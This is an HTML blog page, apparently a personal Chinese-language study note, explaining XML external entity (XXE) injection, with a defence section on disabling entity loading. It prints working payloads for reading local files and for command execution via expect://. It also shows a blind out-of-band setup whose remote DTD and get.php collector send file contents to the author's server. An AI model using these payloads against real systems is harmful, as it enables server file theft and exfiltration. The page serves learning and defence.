@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="http://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="XXE学习"/>
+  <meta name="twitter:description" content=".
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>XXE学习 &middot; Yang1k</title>
+		<link rel="shortcut icon" href="http://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="http://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="http://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='http://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='http://yang1k.github.io/post'>Archive</a>
+	<a href='http://yang1k.github.io/tags'>Tags</a>
+	<a href='http://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="http://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        XXE学习
+                    </h1>
+                    <h2 class="headline">
+                    Jun 8, 2018 09:54
+                    · 261 words
+                    · 2 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="http://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#xml简介">XML简介</a></li>
+<li><a href="#xxe简介">XXE简介</a>
+<ul>
+<li><a href="#第一种">第一种</a></li>
+<li><a href="#第二种">第二种</a></li>
+<li><a href="#第三种">第三种</a></li>
+</ul></li>
+<li><a href="#xxe复现">XXE复现</a>
+<ul>
+<li><a href="#读取任意文件">读取任意文件</a></li>
+<li><a href="#无回显的情况下读取文件-blind-xxe">无回显的情况下读取文件(blind XXE)</a></li>
+<li><a href="#执行系统命令">执行系统命令</a></li>
+<li><a href="#探测内网">探测内网</a></li>
+</ul></li>
+<li><a href="#防御">防御</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>.
+<!-- more --></p>
+
+<h2 id="xml简介">XML简介</h2>
+
+<ul>
+<li>XML 指可扩展标记语言（_EX_tensible _M_arkup _L_anguage）</li>
+<li>XML 是一种_标记语言_，很类似 HTML</li>
+<li>XML 的设计宗旨是_传输数据_，而非显示数据</li>
+<li>XML 标签没有被预定义。您需要_自行定义标签_。</li>
+<li>XML 被设计为具有_自我描述性_。
+<a href="http://www.w3school.com.cn/xml/xml_intro.asp">W3C教程</a></li>
+</ul>
+
+<h2 id="xxe简介">XXE简介</h2>
+
+<p>XXE(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在允许加载外部实体，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
+
+<p>外部引用示例（SYSTEM）</p>
+
+<h3 id="第一种">第一种</h3>
+
+<pre><code>&lt;?php  
+$xml=&lt;&lt;&lt;EOF
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY content SYSTEM &quot;file:///C:/1.txt&quot;&gt;
+]&gt;
+&lt;c&gt;&amp;content;&lt;/c&gt;
+EOF;
+$data = simplexml_load_string($xml);
+print_r($data);
+?&gt;
+</code></pre>
+
+<h3 id="第二种">第二种</h3>
+
+<p>1.php</p>
+
+<pre><code>&lt;?php  
+$xml=&lt;&lt;&lt;EOF
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY % content SYSTEM &quot;http://127.0.0.1/1.dtd&quot;&gt;
+    %content;
+]&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;
+EOF;
+$data = simplexml_load_string($xml);
+print_r($data);
+?&gt;
+</code></pre>
+
+<p>1.dtd如下</p>
+
+<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///C:/1.txt&quot;&gt;
+</code></pre>
+
+<h3 id="第三种">第三种</h3>
+
+<p>1.php</p>
+
+<pre><code>&lt;?php  
+$xml=&lt;&lt;&lt;EOF
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE content SYSTEM &quot;http://127.0.0.1/1.dtd&quot;&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;
+EOF;
+$data = simplexml_load_string($xml);
+print_r($data);
+?&gt;
+</code></pre>
+
+<p>1.dtd</p>
+
+<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///C:/1.txt&quot;&gt;
+</code></pre>
+
+<p>第三个没有试验成功，先记下来。</p>
+
+<p>另外，不同程序支持的协议不一样</p>
+
+<table>
+<thead>
+<tr>
+<th>PHP</th>
+<th>Java</th>
+<th>.NET</th>
+<th>libxml2</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>file</td>
+<td>http</td>
+<td>file</td>
+<td>file</td>
+</tr>
+
+<tr>
+<td>http</td>
+<td>https</td>
+<td>http</td>
+<td>http</td>
+</tr>
+
+<tr>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+</tr>
+
+<tr>
+<td>php</td>
+<td>file</td>
+<td>https</td>
+<td></td>
+</tr>
+
+<tr>
+<td>compress.zlib</td>
+<td>jar</td>
+<td></td>
+<td></td>
+</tr>
+
+<tr>
+<td>compress.bzip2</td>
+<td>netdoc</td>
+<td></td>
+<td></td>
+</tr>
+
+<tr>
+<td>data</td>
+<td>mailto</td>
+<td></td>
+<td></td>
+</tr>
+
+<tr>
+<td>glob</td>
+<td>gopher *</td>
+<td></td>
+<td></td>
+</tr>
+
+<tr>
+<td>phar</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="xxe复现">XXE复现</h2>
+
+<h3 id="读取任意文件">读取任意文件</h3>
+
+<p>文件代码如下</p>
+
+<pre><code>&lt;?php  
+$xml=&lt;&lt;&lt;EOF
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY % content SYSTEM &quot;http://127.0.0.1/1.dtd&quot;&gt;
+    %content;
+]&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;
+EOF;
+$data = simplexml_load_string($xml);
+print_r($data);
+?&gt;
+</code></pre>
+
+<p>访问该文件</p>
+
+<pre><code>127.0.0.1/1.php
+
+SimpleXMLElement Object ( [b] =&gt; SimpleXMLElement Object ( [b] =&gt; yang!!!!!!!!!!!!!!ssssssssssssssssssssss ) ) 
+</code></pre>
+
+<h3 id="无回显的情况下读取文件-blind-xxe">无回显的情况下读取文件(blind XXE)</h3>
+
+<p>上面的利用是在页面有回显得情况下才可以利用的，如果页面没有回显，就需要利用带外信道提取数据。</p>
+
+<p>简单说 就是将读取到的文件内容发送到自己的服务器上。</p>
+
+<p>复现
+上传的xml文件内容(45.php)</p>
+
+<pre><code>&lt;?php  
+$xml=&lt;&lt;&lt;EOF
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY[
+ &lt;!ENTITY % file SYSTEM &quot;file:///C:/1.txt&quot;&gt;
+ &lt;!ENTITY % xml SYSTEM &quot;http://192.168.10.119/yang.xml&quot;&gt;
+%xml;
+%send;
+]&gt;
+EOF;
+// $data = simplexml_load_string(file_get_contents($xml));
+$data = simplexml_load_string($xml);
+print_r($data);
+?&gt;
+
+</code></pre>
+
+<p>服务器yang.xml代码</p>
+
+<pre><code>&lt;!ENTITY % all
+&quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.10.119/get.php?file=%file;'&gt;&quot;
+&gt;
+%all;
+</code></pre>
+
+<p>服务器get.php代码</p>
+
+<pre><code>&lt;?php
+
+file_put_contents(&quot;/home/yang/yang.txt&quot;,$_GET['file']);
+
+?&gt;
+
+</code></pre>
+
+<p>访问上传的文件，读取的文件内容就会在服务器的yang.txt里记录下来。</p>
+
+<p>PS：这里要注意yang.txt的权限。</p>
+
+<h3 id="执行系统命令">执行系统命令</h3>
+
+<pre><code>&lt;?php  
+$xml=&lt;&lt;&lt;EOF
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY[
+ &lt;!ENTITY xxe SYSTEM &quot;expect://dir&quot;&gt;
+]&gt;
+&lt;a&gt;&amp;xxe;&lt;/a&gt;
+EOF;
+$data = simplexml_load_string($xml);
+print_r($data);
+?&gt;
+
+</code></pre>
+
+<p>这个需要php安装expect扩展。</p>
+
+<h3 id="探测内网">探测内网</h3>
+
+<p>没有出现文章所说的报错，可能和php版本有关。</p>
+
+<h2 id="防御">防御</h2>
+
+<p><strong>方案一、使用开发语言提供的禁用外部实体的方法</strong></p>
+
+<pre><code>PHP：
+
+libxml_disable_entity_loader(true);
+
+ JAVA:
+
+DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+
+dbf.setExpandEntityReferences(false);
+
+ Python：
+
+from lxml import etree
+
+xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
+</code></pre>
+
+<p><strong>方案二、过滤用户提交的XML数据</strong></p>
+
+<p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p>
+
+<p><a href="https://security.tencent.com/index.php/blog/msg/69">参考文档</a></p>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fyang1k.github.io%2fpost%2fxee%2f - XXE%e5%ad%a6%e4%b9%a0 "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="http://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="http://yang1k.github.io/js/main.js"></script>
+<script src="http://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
